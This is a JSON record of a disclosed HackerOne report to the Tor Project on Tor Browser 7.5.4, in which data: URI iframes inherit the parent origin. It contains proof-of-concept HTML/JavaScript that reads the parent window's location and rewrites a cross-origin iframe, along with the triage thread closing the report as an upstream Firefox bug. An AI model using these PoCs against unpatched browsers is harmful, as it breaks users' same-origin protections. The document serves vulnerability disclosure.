@@ -1,0 +1,381 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "informative", 
+    "bug_reporter_agreed_on_going_public_at": "2018-06-06T01:29:58.493Z", 
+    "voters": [], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 358005, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-06-06T19:56:28.856Z", 
+    "vulnerability_information": "## Version:\n7.5.4 (based on Mozilla Firefox 52.8.0)\nTested with standard security slider. However, it's likely to be possible with a higher security level.\n\n## Summary\n\nIn Tor Browser iframe with `data:uri` inherits the origin of parent window.\nThat leads to iframe has access to parent window.\n\n## PoC\n\n### Iframe could access parent window's location\n\n>  iframe-access-parent.html \n```html\n<body>\n    <script>\n        let f = document.body.appendChild(document.createElement('iframe'))\n        f.src =\n            'data:text/html,' +\n            `<script>alert(parent.location)</scrip` + `t>` \n        // should throw \"SecurityError...\", instead `alert()` works\n    </script>\n</body>\n```\n\n### iframe could access another iframe with src=data uri\n\n> data-uri-access-another-data-uri.html\n```html\n<body>\n    <script>\n        let g = document.body.appendChild(document.createElement('iframe'))\n        let f = document.body.appendChild(document.createElement('iframe'))\n\n        g.src =\n            'data:text/html,' + 'First iframe with data:uri'\n\n        f.src =\n            'data:text/html,' +\n            `Second iframe with data:uri <script>alert(\"Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: \" + parent.window.frames[0].location.href)</scr` + `ipt>`\n\n    </script>\n</body>\n```\n\n### data:uri iframe could rewrite content of another cross-origin iframe via data:uri\n\n##### 127.0.0.1:5000/exploit.html\n\n```html\n<body>\n    <script>\n        let g = document.body.appendChild(document.createElement('iframe'))\n        let f = document.body.appendChild(document.createElement('iframe'))\n\n        g.src =\n            'http://127.0.0.1:5001/5001.html'\n\n        g.onload = () => {\n            f.src =\n                'data:text/html,' +\n                `Second iframe with data:uri \n                <script>\n                    if (!parent.window.frames[0][0]) {\n                        console.log('This block called in the context of |Second iframe with data:uri|');\n                        console.log('If first script sets parent.window.location to some valid value');\n                        console.log('it removes parent.window.frames[0][0].location from the DOM');\n                        console.log('Tor re-runs script in this cause, but in context of this window');\n                        console.log('e.g. window with |Second iframe with data:uri| text');\n                    } else {\n                        parent.window.frames[0][0].location = \"data:text/html,5000 iframe rewrites  5001<script>\n                        window.onload = () => {\n                            console.log('This block called in the context of |5000 iframe rewrites 5001|');\n                            parent.window.location = 'about:blank'\n                        }\n                        </scr\" + \"ipt>\";\n                    }\n                    \n                </scr` + `ipt>`\n        }\n\n    </script>\n    <h4>we could rewrite data:uri in crossdomain windows</h4>\n</body>\n```\n\n##### 127.0.0.1:5001/5001.html\n```html\n<html>\n\n<body>\n    <script>\n        let y = document.body.appendChild(document.createElement('iframe'))\n        y.src = 'data:text/html,datauri 5001'\n    </script>\n</body>\n\n</html>\n```\n\nThe iframe from 5000 port could rewrite an iframe in a different origin, but it doesn't have access to \"parent\" at 5001 port, so direct UXSS is impossible.\n\n> Also, there is an interesting case described in PoC. Function in the iframe from port 5000 called twice in different contexts. \n\n## Expected behavior\n\n### 1. In latest Chrome, Firefox, Safari iframe with `data:` uri has `null` origin and can't access parent window's location.\n\nPoC in Chrome/FF/Safari throws error:\n\n```\nSecurityError: Blocked a frame with origin \"null\" from accessing a frame with origin \"http://127.0.0.1:5000\".  The frame requesting access has a protocol of \"data\", the frame being accessed has a protocol of \"http\". Protocols must match.\n```\n\n### 2. iframe can't rewrite another iframe's content via data uri.\nSame as in the 1 case.\n\n```\nSecurityError: Permission denied to access property \"href\" on cross-origin object\n```\n\n### 3.\n\nFF\n```\nNS_ERROR_DOM_PROP_ACCESS_DENIED: Access to property denied\n```\n\nChrome/Safari\n```\nUnsafe JavaScript attempt to initiate navigation for frame with URL...\nSecurityError: The operation is insecure.\n```\n\n## Impact\n\nPartial SOP violation. \nDirect UXSS seems impossible, but described behavior opens a wide range of attack scenarios.\n1. Any malicious iframe src=`data:uri` could access parent\n2. Any malicious iframe src=`data:uri` could rewrite other frames's location (to data:uri too) in DOM using `parent.window.frames`", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "Tor Browser: iframe with `data:` uri  has access to parent window", 
+    "is_member_of_team?": null, 
+    "vote_count": 0, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Informative", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "data-uri-access-another-data-uri.html", 
+            "type": "text/html", 
+            "id": 302257, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/257/52aa3d790b4ed9baf2b79b7185794a254e8a57d0/data-uri-access-another-data-uri.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222008Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb425b9cdeb40ed24ac91027e961ccbe601414ad72874dba1f1ada63d22d0184"
+        }, 
+        {
+            "file_name": "iframe-access-parent.html", 
+            "type": "text/html", 
+            "id": 302258, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/258/0e7a7e91b2406cd159329beb7ff2bb52f7aa38c7/iframe-access-parent.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222008Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e086a00452f4fab68b58c576a762e51ffd34f6ece2bfed0923757df23374c3d"
+        }, 
+        {
+            "file_name": "5001.html", 
+            "type": "text/html", 
+            "id": 302259, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/259/66958ca808a454f3c5ec385f9135b7c6766f808a/5001.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222008Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a492264d86c013a428914bbabb2b44aef3e8b44824a2171a786c528e0f990706"
+        }, 
+        {
+            "file_name": "exploit.html", 
+            "type": "text/html", 
+            "id": 302260, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/302/260/5286659bc7df61df007fcc13df37484766668797/exploit.html?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222008Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d5c8cb760f21f13b69f96ffc779549c3850ed8b034e639f2702f364c4c873b64"
+        }
+    ], 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T18:13:04.751Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T18:13:04.751Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "What do you mean with \"latest Firefox\"? There is more than one latest Firefox: There is Firefox 60.0.1, Firefox 60.0.1 ESR, and Firefox 52.8.0 ESR. We are still following the ESR 52 series while we are preparing the switch to ESR 60. Are you claiming that Firefox 52.8.0 ESR does not inhibit that flaw while Tor Browser 7.5.4 does? If not, have you contacted Mozilla to report this bug as well? To test a normal Firefox 52.8.0 ESR you can download a version from https://www.mozilla.org/en-US/firefox/organizations/all/#legacy.", 
+            "markdown_message": "<p>What do you mean with &quot;latest Firefox&quot;? There is more than one latest Firefox: There is Firefox 60.0.1, Firefox 60.0.1 ESR, and Firefox 52.8.0 ESR. We are still following the ESR 52 series while we are preparing the switch to ESR 60. Are you claiming that Firefox 52.8.0 ESR does not inhibit that flaw while Tor Browser 7.5.4 does? If not, have you contacted Mozilla to report this bug as well? To test a normal Firefox 52.8.0 ESR you can download a version from <a title=\"https://www.mozilla.org/en-US/firefox/organizations/all/#legacy\" href=\"/redirect?signature=b57ba373a50b40792628556af825f577a199efc9&amp;url=https%3A%2F%2Fwww.mozilla.org%2Fen-US%2Ffirefox%2Forganizations%2Fall%2F%23legacy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mozilla.org/en-US/firefox/organizations/all/#legacy</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806648, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T18:13:15.936Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T18:13:15.936Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 2806650, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T18:30:21.497Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T18:30:21.497Z", 
+            "actor": {
+                "username": "metnew", 
+                "url": "/metnew", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/544/721cb0f5f0cdc0a6ade55b96a998c87d7e8081e9_medium.jpeg?1527536181"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "Yeah, looks like it's Firefox 52 bug\nSorry, for the report :(", 
+            "markdown_message": "<p>Yeah, looks like it&#39;s Firefox 52 bug<br>\nSorry, for the report :(</p>\n", 
+            "type": "Activities::BugNew", 
+            "id": 2806746, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T19:18:41.030Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T19:18:41.030Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "No worries. I guess that's something Mozilla fixed along with all the other fixes that landed in the Firefox 57/58 timeframe, like https://blog.mozilla.org/security/2017/10/04/treating-data-urls-unique-origins-firefox-57/.", 
+            "markdown_message": "<p>No worries. I guess that&#39;s something Mozilla fixed along with all the other fixes that landed in the Firefox 57/58 timeframe, like <a title=\"https://blog.mozilla.org/security/2017/10/04/treating-data-urls-unique-origins-firefox-57/\" href=\"/redirect?signature=93f6a272f9e9c52eba57e699d8a822ffc4b270bb&amp;url=https%3A%2F%2Fblog.mozilla.org%2Fsecurity%2F2017%2F10%2F04%2Ftreating-data-urls-unique-origins-firefox-57%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://blog.mozilla.org/security/2017/10/04/treating-data-urls-unique-origins-firefox-57/</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
+            "type": "Activities::BugInformative", 
+            "id": 2806922, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-28T19:26:25.135Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-28T19:26:25.135Z", 
+            "actor": {
+                "username": "metnew", 
+                "url": "/metnew", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/544/721cb0f5f0cdc0a6ade55b96a998c87d7e8081e9_medium.jpeg?1527536181"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "I filled a report to Mozilla, but as I understand, ESR should be patched against this, so that's a vulnerability anyway. Hope, they will qualify it as a valid security bug, because of Tor.\nThanks for a quick response!", 
+            "markdown_message": "<p>I filled a report to Mozilla, but as I understand, ESR should be patched against this, so that&#39;s a vulnerability anyway. Hope, they will qualify it as a valid security bug, because of Tor.<br>\nThanks for a quick response!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2806962, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-30T07:27:14.851Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-30T07:27:14.851Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "Could you give us a link to your bug report, so that we can follow it?", 
+            "markdown_message": "<p>Could you give us a link to your bug report, so that we can follow it?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2815515, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-30T13:19:05.858Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-30T13:19:05.858Z", 
+            "actor": {
+                "username": "metnew", 
+                "url": "/metnew", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/544/721cb0f5f0cdc0a6ade55b96a998c87d7e8081e9_medium.jpeg?1527536181"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464884", 
+            "markdown_message": "<p><a title=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1464884\" href=\"/redirect?signature=ed2b61ccafc460dfcfff24e98f879c0454ab5afe&amp;url=https%3A%2F%2Fbugzilla.mozilla.org%2Fshow_bug.cgi%3Fid%3D1464884\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugzilla.mozilla.org/show_bug.cgi?id=1464884</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2817718, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T01:29:58.520Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T01:29:58.520Z", 
+            "actor": {
+                "username": "metnew", 
+                "url": "/metnew", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/544/721cb0f5f0cdc0a6ade55b96a998c87d7e8081e9_medium.jpeg?1527536181"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2847761, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T01:31:52.799Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T01:33:54.587Z", 
+            "actor": {
+                "username": "metnew", 
+                "url": "/metnew", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/038/544/721cb0f5f0cdc0a6ade55b96a998c87d7e8081e9_medium.jpeg?1527536181"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "FF team rejected to fix this problem in ESR52 and ESR60, so Tor browser will continue being vulnerable against this.\nLink: https://bugzilla.mozilla.org/show_bug.cgi?id=1464884", 
+            "markdown_message": "<p>FF team rejected to fix this problem in ESR52 and ESR60, so Tor browser will continue being vulnerable against this.<br>\nLink: <a title=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1464884\" href=\"/redirect?signature=ed2b61ccafc460dfcfff24e98f879c0454ab5afe&amp;url=https%3A%2F%2Fbugzilla.mozilla.org%2Fshow_bug.cgi%3Fid%3D1464884\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugzilla.mozilla.org/show_bug.cgi?id=1464884</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2847766, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T19:56:28.881Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T19:56:28.881Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2851290, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-06-06T19:56:28.944Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-06T19:56:28.944Z", 
+            "actor": {
+                "username": "geko", 
+                "url": "/geko", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "torproject", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2851291, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "metnew", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/metnew", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/038/544/f88c900052ccbbb26f01a29b9352ec6d6378b0aa_small.jpeg?1527536181"
+        }, 
+        "is_me?": false
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-06-06T19:56:28.922Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/358005", 
+    "created_at": "2018-05-27T00:30:07.597Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"version\">Version:</h2>\n\n<p>7.5.4 (based on Mozilla Firefox 52.8.0)<br>\nTested with standard security slider. However, it&#39;s likely to be possible with a higher security level.</p>\n\n<h2 id=\"summary\">Summary</h2>\n\n<p>In Tor Browser iframe with <code>data:uri</code> inherits the origin of parent window.<br>\nThat leads to iframe has access to parent window.</p>\n\n<h2 id=\"poc\">PoC</h2>\n\n<h3 id=\"iframe-could-access-parent-window-s-location\">Iframe could access parent window&#39;s location</h3>\n\n<blockquote>\n<p>iframe-access-parent.html </p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;script&gt;</span>\n        <span class=\"kd\">let</span> <span class=\"nx\">f</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">appendChild</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s1\">&#39;iframe&#39;</span><span class=\"p\">))</span>\n        <span class=\"nx\">f</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span>\n            <span class=\"s1\">&#39;data:text/html,&#39;</span> <span class=\"o\">+</span>\n            <span class=\"s2\">`&lt;script&gt;alert(parent.location)&lt;/scrip`</span> <span class=\"o\">+</span> <span class=\"s2\">`t&gt;`</span> \n        <span class=\"c1\">// should throw &quot;SecurityError...&quot;, instead `alert()` works</span>\n    <span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n</code></pre>\n</blockquote>\n\n<h3 id=\"iframe-could-access-another-iframe-with-src-data-uri\">iframe could access another iframe with src=data uri</h3>\n\n<blockquote>\n<p>data-uri-access-another-data-uri.html</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;script&gt;</span><span class=\"err\">\n        let g = document.body.appendChild(document.createElement(&#39;iframe&#39;))\n        let f = document.body.appendChild(document.createElement(&#39;iframe&#39;))\n</span></code></pre>\n</blockquote>\n<pre class=\"highlight plaintext\"><code>    g.src =\n        &#39;data:text/html,&#39; + &#39;First iframe with data:uri&#39;\n\n    f.src =\n        &#39;data:text/html,&#39; +\n        `Second iframe with data:uri &lt;script&gt;alert(&quot;Iframe with data:uri could access another same-origin iframe with data:uri, first iframe location is: &quot; + parent.window.frames[0].location.href)&lt;/scr` + `ipt&gt;`\n\n&lt;/script&gt;\n</code></pre>\n<p>&lt;/body&gt;</p>\n<pre class=\"highlight plaintext\"><code>\n### data:uri iframe could rewrite content of another cross-origin iframe via data:uri\n\n##### 127.0.0.1:5000/exploit.html\n\n```html\n&lt;body&gt;\n    &lt;script&gt;\n        let g = document.body.appendChild(document.createElement(&#39;iframe&#39;))\n        let f = document.body.appendChild(document.createElement(&#39;iframe&#39;))\n\n        g.src =\n            &#39;http://127.0.0.1:5001/5001.html&#39;\n\n        g.onload = () =&gt; {\n            f.src =\n                &#39;data:text/html,&#39; +\n                `Second iframe with data:uri \n                &lt;script&gt;\n                    if (!parent.window.frames[0][0]) {\n                        console.log(&#39;This block called in the context of |Second iframe with data:uri|&#39;);\n                        console.log(&#39;If first script sets parent.window.location to some valid value&#39;);\n                        console.log(&#39;it removes parent.window.frames[0][0].location from the DOM&#39;);\n                        console.log(&#39;Tor re-runs script in this cause, but in context of this window&#39;);\n                        console.log(&#39;e.g. window with |Second iframe with data:uri| text&#39;);\n                    } else {\n                        parent.window.frames[0][0].location = &quot;data:text/html,5000 iframe rewrites  5001&lt;script&gt;\n                        window.onload = () =&gt; {\n                            console.log(&#39;This block called in the context of |5000 iframe rewrites 5001|&#39;);\n                            parent.window.location = &#39;about:blank&#39;\n                        }\n                        &lt;/scr&quot; + &quot;ipt&gt;&quot;;\n                    }\n\n                &lt;/scr` + `ipt&gt;`\n        }\n\n    &lt;/script&gt;\n    &lt;h4&gt;we could rewrite data:uri in crossdomain windows&lt;/h4&gt;\n&lt;/body&gt;\n</code></pre>\n<h5 id=\"127-0-0-1-5001-5001-html\">127.0.0.1:5001/5001.html</h5>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n\n<span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;script&gt;</span>\n        <span class=\"kd\">let</span> <span class=\"nx\">y</span> <span class=\"o\">=</span> 